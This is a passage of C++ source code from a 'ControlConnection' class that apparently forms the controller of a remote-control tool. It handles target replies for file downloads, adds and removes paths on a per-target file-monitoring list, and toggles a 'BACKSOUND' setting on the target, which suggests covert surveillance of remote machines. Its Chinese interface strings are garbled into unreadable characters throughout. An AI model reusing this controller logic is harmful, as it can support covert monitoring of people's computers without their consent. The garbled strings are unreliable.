				if ( IDCANCEL == MessageBox(NULL, msg, L"��ʾ", MB_OKCANCEL | MB_ICONINFORMATION) )
					return 0;
			}

			SetTarStatusInfoExW(STATUS_INFO, tarBlock, 
				L"������� : ���� \"%s\"", realPath.c_str());
			tarBlock->tarConn->Send_AFT(tarBlock->dwTargetID,
				FILEDOWN,
				GetBase64FromWide(ctrPathW).c_str(),
				GetBase64FromWide(realPath).c_str(),
				(ULONG)size);
		}

		return 0;
	}


	if ("OK" == args[5])
	{
		std::wstring path = GetWideFromBase64(args[4]);
		time_t curtime;
		time(&curtime);
		std::string timStr = GetTimeString(curtime);
		ULONG add = strtoul(args[3].c_str(),NULL,10);

		if ( 1 == add )
			DM->InsertFileMonitorList(
				targetID, 
				GetNameFromPath(path, UnixLike(tarBlock) ? L'/' : L'\\'), 
				path, 
				AnsiToWide(TGetCurrentTime()).c_str(), 
				L"�ļ���", 
				1);
		else
			DM->RemoveFileMonitorList(
				targetID,
				path);

		SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%u)] %s���� \"%s\"�ɹ�",
			tarBlock->widTargetName.c_str(),
			tarBlock->dwTargetID,
			add == 1 ? L"���" : L"ȡ��",
			path.c_str());

		if (tarBlock->frmTarControl)
		{
			SendMessage(tarBlock->frmTarControl->Handle, WM_FILEMONITOR_FINISHED, (LONG)path.c_str(), (ULONG)add);
		}
	}
	else      // ERR
	{
		std::wstring path = GetWideFromBase64(args[3]);
		int nErrCode = strtoul(args[5].c_str(), NULL, 10);
		ULONG add = strtoul(args[2].c_str(),NULL,10);

		SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%u)] %s���� \"%s\" ʧ��: %s",
			tarBlock->widTargetName.c_str(),
			tarBlock->dwTargetID,
			L"���",
			path.c_str(),
			ConvertErrorIdToStrW(nErrCode).c_str());
	}

	return 0;
}

int ControlConnection::Handle_BACKSOUND(std::vector<std::string>& args)
{
	// TID PID BGS ONOROFF RET

	if ( args.size() < 4 )
		return 0;

	bool on = args[3] == "1";
	bool ok = args[4] == "1";

	std::wstring infomation;

	if ( ok )
		infomation = L"�������������óɹ�";
	else
		infomation = L"��������������ʧ��";

	ULONG targetID = strtoul(args[0].c_str(),NULL,10);
	Target * tarBlock = GetTargetFromGlobalMap(targetID);

	if ( tarBlock->frmTarControl )
	{
		SendMessage(tarBlock->frmTarControl->Handle, WM_BACKSOUND_SETTING, (WPARAM)(infomation.c_str()), NULL);
	}

	return 0 ;
}